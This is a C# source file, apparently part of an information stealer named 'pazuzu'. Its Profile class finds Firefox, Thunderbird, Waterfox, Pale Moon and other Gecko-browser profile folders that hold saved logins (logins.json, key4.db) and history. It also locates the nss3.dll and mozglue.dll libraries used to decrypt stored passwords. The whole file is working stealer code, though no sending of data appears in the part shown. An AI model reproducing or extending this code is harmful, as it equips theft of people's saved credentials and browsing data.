using System;
using System.Collections.Generic;
using System.IO;

namespace pazuzu.FireFox;

internal class Profile
{
	public static string Appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string[] GeckoBrowsersList = new string[8] { "Mozilla\\Firefox", "Waterfox", "K-Meleon", "Thunderbird", "Comodo\\IceDragon", "8pecxstudios\\Cyberfox", "NETGATE Technologies\\BlackHaw", "Moonchild Productions\\Pale Moon" };

	private static string[] Concat(string[] x, string[] y)
	{
		if (x == null)
		{
			throw new ArgumentNullException("x");
		}
		if (y == null)
		{
			throw new ArgumentNullException("y");
		}
		int destinationIndex = x.Length;
		Array.Resize(ref x, x.Length + y.Length);
		Array.Copy(y, 0, x, destinationIndex, y.Length);
		return x;
	}

	private static string[] ProgramFilesChildren()
	{
		string[] array = Directory.GetDirectories(Environment.GetEnvironmentVariable("ProgramFiles"));
		if (8 == IntPtr.Size || !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432")))
		{
			array = Concat(array, Directory.GetDirectories(Environment.GetEnvironmentVariable("ProgramFiles(x86)")));
		}
		return array;
	}

	public static string GetProfile(string path)
	{
		try
		{
			string path2 = Path.Combine(path, "Profiles");
			if (Directory.Exists(path2))
			{
				string[] directories = Directory.GetDirectories(path2);
				foreach (string text in directories)
				{
					if (File.Exists(text + "\\logins.json") || File.Exists(text + "\\key4.db") || File.Exists(text + "\\places.sqlite"))
					{
						return text;
					}
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("\n" + ex);
		}
		return null;
	}

	public static string GetMozillaPath()
	{
		string[] array = ProgramFilesChildren();
		int num = 0;
		string text;
		while (true)
		{
			if (num < array.Length)
			{
				text = array[num];
				if (File.Exists(text + "\\nss3.dll") && File.Exists(text + "\\mozglue.dll"))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return text;
	}

	public static string[] GetMozillaBrowsers()
	{
		List<string> list = new List<string>();
		string[] geckoBrowsersList = GeckoBrowsersList;
		foreach (string path in geckoBrowsersList)
		{
			string text = Path.Combine(Appdata, path);
			if (Directory.Exists(text))
			{
				list.Add(text);
			}
		}
		return list.ToArray();
	}
}
